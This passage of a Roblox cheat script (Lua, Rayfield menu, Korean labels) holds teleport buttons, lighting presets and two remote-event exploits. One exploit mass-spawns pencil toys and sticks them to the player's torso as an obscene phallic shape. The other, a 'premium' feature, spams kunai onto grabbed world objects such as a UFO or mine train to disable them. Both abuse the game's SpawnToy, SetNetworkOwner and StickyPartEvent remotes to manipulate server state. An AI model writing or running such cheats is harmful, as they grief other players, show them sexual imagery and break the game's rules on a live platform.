                Duration = 3,
                Image = nil,
            })
        end
    end,
})

 funTab:CreateButton({
   Name = "텔포",
   Callback = function()
      if not Value then return end
      local hrp = plr.Character:WaitForChild("HumanoidRootPart")
      local pos = hrp.Position
      hrp.CFrame = CFrame.new(pos.X, Value, pos.Z)
   end,
})

funTab:CreateSection("이동할곳")
local teleportLocations = {
    ["스폰"] = {0, -7, 0},
    ["스폰산"] = {494, 163, 175},
    ["설산"] = {-394, 230, 509},
    ["헛간(농지)"] = {-156, 59, -291},
    ["위험구역"] = {125, -7, 241},
    ["하늘섬"] = {63, 346, 309},
    ["큰동굴"] = {-240, 29, 554},
    ["작은동굴"] = {-84, 14, -310},
    ["열차동굴"] = {602, 45, -175},
    ["광산"] = {-308, -7, 506},
    ["초록집"] = {-352, 98, 353},
    ["(초록집)"] = {-532, -7, 92},
    ["(분홍집)"] = {-484, -7, -165},
    ["(보라집)"] = {249, -7, 461},
    ["(파랑집)"] = {513, 83, -341},
    ["(빨강집)"] = {551, 123, -73},
    ["슬롯1"] = {51, 11, -118},
    ["슬롯2"] = {-543, 11, -40},
    ["슬롯3"] = {169, 11, 530},
    ["슬롯4"] = {-214, 102, 423},
    ["슬롯5"] = {563, 102, -218},
    ["독우물 아래"] = {121, -56, 251},
}

local selectedLocation = "스폰"

local Dropdown = plotTab:CreateDropdown({
    Name = "위치 고르기",
    Options = {"스폰","스폰산","광산","큰동굴","작은동굴","열차동굴","위험구역","설산","헛간(농지)","하늘섬","초록집","(초록집)","(분홍집)","(보라집)","(파랑집)","(빨강집)","슬롯1","슬롯2","슬롯3","슬롯4","슬롯5","독우물 아래"},
    CurrentOption = "스폰",
    MultipleOptions = false,
    Callback = function(Value)
        if typeof(Value) == "table" then
            selectedLocation = Value[1] or "스폰"
        else
            selectedLocation = Value
        end
    end,
})

local Button = plotTab:CreateButton({
    Name = "텔포",
    Callback = function()
        local plr = game.Players.LocalPlayer
        local char = plr.Character or plr.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        local pos = teleportLocations[selectedLocation]
        if not pos then
            return
        end

        hrp.CFrame = CFrame.new(pos[1], pos[2], pos[3])
    end,
})


funTab:CreateSection("꼬추 만들기")
local Inputt = funTab:CreateInput({
   Name = "연필    <font color='rgb(200,0,255)'>[dick]</font>",
   CurrentValue = "",
   PlaceholderText = "Value",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Text)
   end
})

local Ctratee = funTab:CreateButton({
   Name = "만들기",
   Callback = function()
       local ReplicatedStorage = game:GetService("ReplicatedStorage")
       local pencilCountText = Inputt.CurrentValue
       local TNUM = tonumber(pencilCountText)

       if not TNUM or TNUM <= 0 then
           warn("Please enter a valid number!")
           Rayfield:Notify({Title = "[ ✏️ ]", Content = "Nil Value", Duration = 3, Image = 0})
           return
       end

       local character = plr.Character or plr.CharacterAdded:Wait()
       local hrp = character:WaitForChild("HumanoidRootPart")
       local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
       local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
       local SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")


function GetPlotNumber()
    local char = plr.Character
    if not char then return nil end

    if char.Parent == workspace then 
        return nil
    elseif char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        return 1
                    elseif plot.Name == "Plot2" then
                        return 2
                    elseif plot.Name == "Plot3" then
                        return 3
                    elseif plot.Name == "Plot4" then
                        return 4
                    elseif plot.Name == "Plot5" then
                        return 5
                    end
                end
            end
        end
    end
    return nil
end

function GetInventory()
    local plotNumber = GetPlotNumber()

    if plotNumber then
        local plotItems = workspace:FindFirstChild("PlotItems")
        if plotItems then
            local plotFolder = plotItems:FindFirstChild("Plot" .. plotNumber)
            if plotFolder then
                return plotFolder
            end
        end
    end
    return workspace:WaitForChild(plr.Name .. "SpawnedInToys")
end

local inv = GetInventory()

function createPencil(index)
    while not plr.CanSpawnToy.Value do task.wait() end

    task.spawn(function()
        SpawnToy:InvokeServer("ToolPencil", hrp.CFrame * CFrame.new(0,5,15), Vector3.new(0,0,0))
    end)

    task.wait(0.3)

    inv = GetInventory()

    local pencil
    local children = inv:GetChildren()
    for i = #children, 1, -1 do
        if children[i].Name == "ToolPencil" then
            pencil = children[i]
            break
        end
    end

    if not pencil then 
        print("Pencil not found in inventory")
        return nil 
    end

    local stickyPart = pencil:WaitForChild("StickyPart")
    local SoundPart = pencil:WaitForChild("SoundPart")

    if stickyPart and SoundPart then
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, character.Torso.CFrame)
    end

    local PartOwner = SoundPart:WaitForChild("PartOwner")
    if PartOwner then
        SoundPart.CFrame = CFrame.new(0, 599999, 999)
    end

    stickyPart.Name = "w" .. index

    for _, part in pairs(pencil:GetDescendants()) do
        if part:IsA("BasePart") and part.Color == Color3.fromRGB(158, 108, 141) then
            part.Name = "a" .. index
        end
    end

    return pencil
end

local pencils = {}

for i = 1, TNUM do
    local pencil = createPencil(i)
    if pencil then
        table.insert(pencils, pencil)
    end
    task.wait(0.1)
end

for i = 1, #pencils - 1 do
    local currentPencil = pencils[i]
    local nextPencil = pencils[i + 1]

    if currentPencil and nextPencil then
        local attachFrom = currentPencil:FindFirstChild("w" .. i)
        local attachTo = nextPencil:FindFirstChild("a" .. (i + 1))

        if attachFrom and attachTo then
            StickyPartEvent:FireServer(attachFrom, attachTo, CFrame.Angles(0, math.rad(-90), 0))
        end
    end
    task.wait(0.05)
end

local torso2 = character:WaitForChild("HumanoidRootPart"):WaitForChild("RagdollTouchedHitbox")
local torso = character:FindFirstChild("Torso")
if torso2 and #pencils >= TNUM then
    local lastPencil = pencils[TNUM]
    if lastPencil then
        local wLast = lastPencil:FindFirstChild("w" .. TNUM)
        if wLast then
            local attachPosition = torso2.CFrame * CFrame.new(0, -1.1, 0.1) * CFrame.Angles(0, math.rad(180), 0) -- CFrame.new(0, -torso2.Size.Y/2 - -0.1, -0.5)
            local relativeCF = torso2.CFrame:ToObjectSpace(attachPosition)
            StickyPartEvent:FireServer(wLast, torso2, relativeCF)
        end
    end
end
   end
})

funTab:CreateSection("떠있는것들 무력화")
local Inputt = funTab:CreateInput({
   Name = "쿠나이",
   CurrentValue = "",
   PlaceholderText = "Value",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Text)
   end
})

funTab:CreateSection("UFO,하늘섬 돌,광산열차를 잡은채로 10으로설정한후 만들기를 해보세요.")
local Ctratee = funTab:CreateButton({
   Name = "무력화   <font color='rgb(0,0,255)'>[프리미엄]</font>",
   Callback = function()
       local ReplicatedStorage = game:GetService("ReplicatedStorage")
       local Players = game:GetService("Players")
       local plr = Players.LocalPlayer
       
       local kunaiCountText = Inputt.CurrentValue
       local TNUM = tonumber(kunaiCountText)

       if not TNUM or TNUM <= 0 or TNUM > 100 then
           Rayfield:Notify({Title = "[ 🥷 ]", Content = "Invalid Value", Duration = 3, Image = 0})
           return
       end

       local character = plr.Character or plr.CharacterAdded:Wait()
       local hrp = character:WaitForChild("HumanoidRootPart")
       local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
       
       if not torso then
           return
       end
       
       local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
       local SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")

       function GetTargetPartFromGrabParts()
           local grabPartsModel = workspace:FindFirstChild("GrabParts")
           if not grabPartsModel then return nil end

           local grabPart = grabPartsModel:FindFirstChild("GrabPart")
           if not grabPart then return nil end

           local weldConstraint = grabPart:FindFirstChild("WeldConstraint")
           if not weldConstraint or not weldConstraint:IsA("WeldConstraint") then return nil end

           if not weldConstraint.Part1 then return nil end

           return weldConstraint.Part1
       end

       function GetPlotNumber()
           local char = plr.Character
           if not char then return nil end

           if char.Parent == workspace then 
               return nil
           elseif char.Parent.Name == "PlayersInPlots" then
               for _, plot in workspace.Plots:GetChildren() do
                   local plotSign = plot:FindFirstChild("PlotSign")
                   if plotSign and plotSign:FindFirstChild("ThisPlotsOwners") then
                       for _, owner in plotSign.ThisPlotsOwners:GetChildren() do
                           if owner.Value == plr.Name then
                               if plot.Name == "Plot1" then
                                   return 1
                               elseif plot.Name == "Plot2" then
                                   return 2
                               elseif plot.Name == "Plot3" then
                                   return 3
                               elseif plot.Name == "Plot4" then
                                   return 4
                               elseif plot.Name == "Plot5" then
                                   return 5
                               end
                           end
                       end
                   end
               end
           end
           return nil
       end

       function GetInventory()
           local plotNumber = GetPlotNumber()

           if plotNumber then
               local plotItems = workspace:FindFirstChild("PlotItems")
               if plotItems then
                   local plotFolder = plotItems:FindFirstChild("Plot" .. plotNumber)
                   if plotFolder then
                       return plotFolder
                   end
               end
           end
           
           local defaultInv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
           if defaultInv then
               return defaultInv
           end
           
           return nil
       end

       local targetPart = GetTargetPartFromGrabParts()
       if not targetPart then
           return
       end

       function createAndAttachKunai()
           while not plr.CanSpawnToy.Value do 
               task.wait(0.1) 
           end

           local position = hrp.CFrame

           local success, result = pcall(function()
 task.spawn(function()
               return SpawnToy:InvokeServer("NinjaKunai", hrp.CFrame * CFrame.new(0,5,15), Vector3.new(0, 0, 0))
           end)
           end)
           
           if not success then
               return nil
           end

           task.wait(0.2)

           local inv = GetInventory()
           if not inv then
               return nil
           end

           local kunai
           local children = inv:GetChildren()
           for i = #children, 1, -1 do
               if children[i].Name == "NinjaKunai" then
                   kunai = children[i]
                   break
               end
           end

           if not kunai then 
               return nil 
           end

           local stickyPart = kunai:WaitForChild("StickyPart")
           local SoundPart = kunai:WaitForChild("SoundPart")

           if stickyPart and SoundPart then
               pcall(function()
                   ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
                   ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, torso.CFrame)
               end)
           end

           if stickyPart then
               local attachPosition = targetPart.CFrame
               local relativeCF = targetPart.CFrame:ToObjectSpace(attachPosition)

               pcall(function()
                   StickyPartEvent:FireServer(stickyPart, targetPart, relativeCF)
               end)
           end

           task.wait(0.1)
           return kunai
       end

       for i = 1, TNUM do
           createAndAttachKunai()
           task.wait(0.1)
       end
   end
})

bdTab:CreateSection("배경")
bdTab:CreateButton({
    Name = "기본값",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") 
            or obj:IsA("BloomEffect") or obj:IsA("ColorCorrectionEffect") 
            or obj:IsA("SunRaysEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(120, 120, 120)
        Lighting.Brightness = 2
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0.25
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
        Lighting.ShadowSoftness = 0.2
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 14
        Lighting.GeographicLatitude = 41.735
        Lighting.FogColor = Color3.fromRGB(192, 192, 192)
        Lighting.FogEnd = 100000
        Lighting.FogStart = 0

        local sky = Instance.new("Sky")
        sky.Parent = Lighting
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 0
        sky.MoonTextureId = "rbxasset://sky/moon.jpg"
        sky.SkyboxBk = "rbxassetid://8995816670"
        sky.SkyboxDn = "rbxassetid://8995686153"
        sky.SkyboxFt = "rbxassetid://8995816670"
        sky.SkyboxLf = "rbxassetid://8995816670"
        sky.SkyboxRt = "rbxassetid://8995816670"
        sky.SkyboxUp = "rbxassetid://8995814929"
        sky.StarCount = 3000
        sky.SunAngularSize = 30
        sky.SunTextureId = "rbxassetid://8923082571"
    end
})

bdTab:CreateButton({
    Name = "낮시간",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(0, 0, 0)
        Lighting.Brightness = 3.13
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(188, 141, 1)
        Lighting.EnvironmentDiffuseScale = 0.583
        Lighting.EnvironmentSpecularScale = 1
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(145, 128, 95)
        Lighting.ShadowSoftness = 0.04
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 14.5
        Lighting.GeographicLatitude = 143
        Lighting.FogColor = Color3.fromRGB(146, 208, 255)
        Lighting.FogEnd = 3000
        Lighting.FogStart = 300

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 11
        sky.MoonTextureId = "rbxassetid://6444320592"
        sky.SkyboxBk = "rbxassetid://6444884337"
        sky.SkyboxDn = "rbxassetid://6444884785"
        sky.SkyboxFt = "rbxassetid://6444884337"
        sky.SkyboxLf = "rbxassetid://6444884337"
        sky.SkyboxRt = "rbxassetid://6444884337"
        sky.SkyboxUp = "rbxassetid://6412503613"
        sky.StarCount = 0
        sky.SunAngularSize = 11
        sky.SunTextureId = "rbxassetid://1084351190"

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1
        bloom.Size = 90
        bloom.Threshold = 2

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.04
        cc.Contrast = 0.19
        cc.Saturation = 0.12
        cc.TintColor = Color3.fromRGB(255, 255, 255)
    end
})

bdTab:CreateButton({
    Name = "새벽",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(109, 117, 135)
        Lighting.Brightness = 1.921
        Lighting.ColorShift_Bottom = Color3.fromRGB(248, 165, 159)
        Lighting.ColorShift_Top = Color3.fromRGB(226, 75, 0)
        Lighting.EnvironmentDiffuseScale = 0.172
        Lighting.EnvironmentSpecularScale = 0.738
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(36, 47, 58)
        Lighting.ShadowSoftness = 0.25
        Lighting.Technology = Enum.Technology.Future
        Lighting.TimeOfDay = "-06:23:59"
        Lighting.GeographicLatitude = 0
        Lighting.FogColor = Color3.fromRGB(192, 192, 192)
        Lighting.FogEnd = 100000
        Lighting.FogStart = 0

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.359
        atmosphere.Offset = 0
        atmosphere.Color = Color3.fromRGB(255, 216, 194)
        atmosphere.Decay = Color3.fromRGB(123, 151, 182)
        atmosphere.Glare = 2.97
        atmosphere.Haze = 1.52

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 0
        sky.MoonTextureId = "rbxasset://sky/moon.jpg"
        sky.SkyboxBk = "rbxassetid://88585370973398"
        sky.SkyboxDn = "rbxassetid://128014535205529"
        sky.SkyboxFt = "rbxassetid://85323615042244"
        sky.SkyboxLf = "rbxassetid://77415797450913"
        sky.SkyboxRt = "rbxassetid://127566931602371"
        sky.SkyboxUp = "rbxassetid://102320981098060"
        sky.StarCount = 5000
        sky.SunAngularSize = 4
        sky.SunTextureId = "rbxasset://sky/sun.jpg"

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1
        bloom.Size = 50
        bloom.Threshold = 2.291

        local blur = Lighting:FindFirstChildOfClass("BlurEffect") or Instance.new("BlurEffect", Lighting)
        blur.Enabled = false
        blur.Size = 4

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0
        cc.Contrast = 0.2
        cc.Saturation = 0
        cc.TintColor = Color3.fromRGB(255, 255, 255)

        local sunrays = Lighting:FindFirstChildOfClass("SunRaysEffect") or Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.024
        sunrays.Spread = 0.463
    end
})

bdTab:CreateButton({
    Name = "흐린",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(0, 0, 0)
        Lighting.Brightness = 5.63
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(207, 114, 0)
        Lighting.EnvironmentDiffuseScale = 0.583
        Lighting.EnvironmentSpecularScale = 1
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(89, 68, 47)
        Lighting.ShadowSoftness = 0.04
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 17.629
        Lighting.GeographicLatitude = 21.589
        Lighting.FogColor = Color3.fromRGB(146, 208, 255)
        Lighting.FogEnd = 3000
        Lighting.FogStart = 300

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.357
        atmosphere.Offset = 0
        atmosphere.Color = Color3.fromRGB(165, 165, 165)
        atmosphere.Decay = Color3.fromRGB(16, 16, 16)
        atmosphere.Glare = 0.21
        atmosphere.Haze = 1.46

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 1.5
        sky.MoonTextureId = "rbxassetid://1075087760"
        sky.SkyboxBk = "rbxassetid://2177969403"
        sky.SkyboxDn = "rbxassetid://2177972406"
        sky.SkyboxFt = "rbxassetid://2177970251"
        sky.SkyboxLf = "rbxassetid://2177969836"
        sky.SkyboxRt = "rbxassetid://2177968823"
        sky.SkyboxUp = "rbxassetid://2177971305"
        sky.StarCount = 500
        sky.SunAngularSize = 3
        sky.SunTextureId = "rbxasset://sky/sun.jpg"

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1
        bloom.Size = 90
        bloom.Threshold = 2

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.04
        cc.Contrast = 0.15
        cc.Saturation = 0.2
        cc.TintColor = Color3.fromRGB(255, 255, 255)

        local sunrays = Lighting:FindFirstChildOfClass("SunRaysEffect") or Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.004
        sunrays.Spread = 0.167
    end
})

bdTab:CreateButton({
    Name = "밤시간",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(15, 15, 25)
        Lighting.Brightness = 0.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(20, 20, 40)
        Lighting.EnvironmentDiffuseScale = 0.1
        Lighting.EnvironmentSpecularScale = 0.5
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(20, 25, 45)
        Lighting.ShadowSoftness = 0.5
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0
        Lighting.GeographicLatitude = 41.735
        Lighting.FogColor = Color3.fromRGB(5, 5, 15)
        Lighting.FogEnd = 5000
        Lighting.FogStart = 500

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 25
        sky.MoonTextureId = "rbxassetid://6444320592"
        sky.SkyboxBk = "rbxassetid://121245963"
        sky.SkyboxDn = "rbxassetid://121246112"
        sky.SkyboxFt = "rbxassetid://121246014"
        sky.SkyboxLf = "rbxassetid://121245846"
        sky.SkyboxRt = "rbxassetid://121246066"
        sky.SkyboxUp = "rbxassetid://121245915"
        sky.StarCount = 6000
        sky.SunAngularSize = 0
        sky.SunTextureId = ""

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 0.5
        bloom.Size = 24
        bloom.Threshold = 0.9

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = -0.02
        cc.Contrast = 0.1
        cc.Saturation = -0.05
        cc.TintColor = Color3.fromRGB(230, 235, 255)
    end
})

bdTab:CreateButton({
    Name = "선셋",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(50, 30, 30)
        Lighting.Brightness = 2.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(120, 50, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 140, 50)
        Lighting.EnvironmentDiffuseScale = 0.4
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(90, 50, 40)
        Lighting.ShadowSoftness = 0.1
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 18.2
        Lighting.GeographicLatitude = 35
        Lighting.FogColor = Color3.fromRGB(240, 130, 80)
        Lighting.FogEnd = 8000
        Lighting.FogStart = 400

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.4
        atmosphere.Offset = 0.2
        atmosphere.Color = Color3.fromRGB(255, 120, 60)
        atmosphere.Decay = Color3.fromRGB(50, 20, 80)
        atmosphere.Glare = 1.5
        atmosphere.Haze = 2

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 0
        sky.SkyboxBk = "rbxassetid://6008860031"
        sky.SkyboxDn = "rbxassetid://6008860471"
        sky.SkyboxFt = "rbxassetid://6008860165"
        sky.SkyboxLf = "rbxassetid://6008860274"
        sky.SkyboxRt = "rbxassetid://6008860381"
        sky.SkyboxUp = "rbxassetid://6008860580"
        sky.StarCount = 200
        sky.SunAngularSize = 18
        sky.SunTextureId = "rbxasset://sky/sun.jpg"

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.5
        bloom.Size = 40
        bloom.Threshold = 1.5

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.15
        cc.Saturation = 0.3
        cc.TintColor = Color3.fromRGB(255, 240, 220)

        local sunrays = Lighting:FindFirstChildOfClass("SunRaysEffect") or Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.12
        sunrays.Spread = 0.7
    end
})

bdTab:CreateButton({
    Name = "사이버펑크",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(30, 20, 45)
        Lighting.Brightness = 1.8
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 255, 255)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 0, 128)
        Lighting.EnvironmentDiffuseScale = 0.7
        Lighting.EnvironmentSpecularScale = 1
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(35, 25, 50)
        Lighting.ShadowSoftness = 0.05
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 20.5
        Lighting.GeographicLatitude = 45
        Lighting.FogColor = Color3.fromRGB(25, 15, 35)
        Lighting.FogEnd = 4000
        Lighting.FogStart = 200

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.45
        atmosphere.Offset = 0
        atmosphere.Color = Color3.fromRGB(255, 0, 150)
        atmosphere.Decay = Color3.fromRGB(0, 150, 255)
        atmosphere.Glare = 0.5
        atmosphere.Haze = 2.5

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 5
        sky.SkyboxBk = "rbxassetid://273934335"
        sky.SkyboxDn = "rbxassetid://273934526"
        sky.SkyboxFt = "rbxassetid://273934381"
        sky.SkyboxLf = "rbxassetid://273934441"
        sky.SkyboxRt = "rbxassetid://273934483"
        sky.SkyboxUp = "rbxassetid://273934594"
        sky.StarCount = 1000

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.5
        bloom.Size = 70
        bloom.Threshold = 0.5

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.05
        cc.Contrast = 0.3
        cc.Saturation = 0.5
        cc.TintColor = Color3.fromRGB(255, 255, 255)
    end
})

bdTab:CreateButton({
    Name = "환상퍼플",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(70, 50, 90)
        Lighting.Brightness = 2.2
        Lighting.ColorShift_Bottom = Color3.fromRGB(150, 100, 200)
        Lighting.ColorShift_Top = Color3.fromRGB(200, 150, 255)
        Lighting.EnvironmentDiffuseScale = 0.6
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(60, 45, 85)
        Lighting.ShadowSoftness = 0.3
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 16.5
        Lighting.GeographicLatitude = 60
        Lighting.FogColor = Color3.fromRGB(110, 85, 140)
        Lighting.FogEnd = 6000
        Lighting.FogStart = 100

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.28
        atmosphere.Offset = 0.1
        atmosphere.Color = Color3.fromRGB(220, 180, 255)
        atmosphere.Decay = Color3.fromRGB(90, 60, 130)
        atmosphere.Glare = 1
        atmosphere.Haze = 1.2

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 15
        sky.SkyboxBk = "rbxassetid://9054701258"
        sky.SkyboxDn = "9054701955"
        sky.SkyboxFt = "rbxassetid://9054701460"
        sky.SkyboxLf = "rbxassetid://9054701601"
        sky.SkyboxRt = "rbxassetid://9054701740"
        sky.SkyboxUp = "rbxassetid://9054702082"
        sky.StarCount = 4000

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.2
        bloom.Size = 56
        bloom.Threshold = 1.6

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.01
        cc.Contrast = 0.22
        cc.Saturation = 0.45
        cc.TintColor = Color3.fromRGB(255, 240, 255)

        local sunrays = Lighting:FindFirstChildOfClass("SunRaysEffect") or Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.06
        sunrays.Spread = 0.5
    end
})

bdTab:CreateButton({
    Name = "호러안개",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(5, 8, 8)
        Lighting.Brightness = 0.3
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(10, 15, 15)
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0.1
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(8, 12, 12)
        Lighting.ShadowSoftness = 0.9
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 2.5
        Lighting.GeographicLatitude = 20
        Lighting.FogColor = Color3.fromRGB(15, 20, 20)
        Lighting.FogEnd = 350
        Lighting.FogStart = 0

        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.85
        atmosphere.Offset = 0
        atmosphere.Color = Color3.fromRGB(20, 25, 25)
        atmosphere.Decay = Color3.fromRGB(5, 5, 5)
        atmosphere.Glare = 0
        atmosphere.Haze = 5

        local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = false
        sky.SkyboxBk = "rbxassetid://11144211158"
        sky.SkyboxDn = "rbxassetid://11144211158"
        sky.SkyboxFt = "rbxassetid://11144211158"
        sky.SkyboxLf = "rbxassetid://11144211158"
        sky.SkyboxRt = "rbxassetid://11144211158"
        sky.SkyboxUp = "rbxassetid://11144211158"
        sky.StarCount = 0

        local bloom = Lighting:FindFirstChildOfClass("BloomEffect") or Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 0.2
        bloom.Size = 10
        bloom.Threshold = 3

        local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = -0.05
        cc.Contrast = 0.4
        cc.Saturation = -0.6
        cc.TintColor = Color3.fromRGB(220, 230, 230)
    end
})
bdTab:CreateButton({
    Name = "🌌 은하수 파노라마",
    Callback = function()
        local Lighting = game:GetService("Lighting")

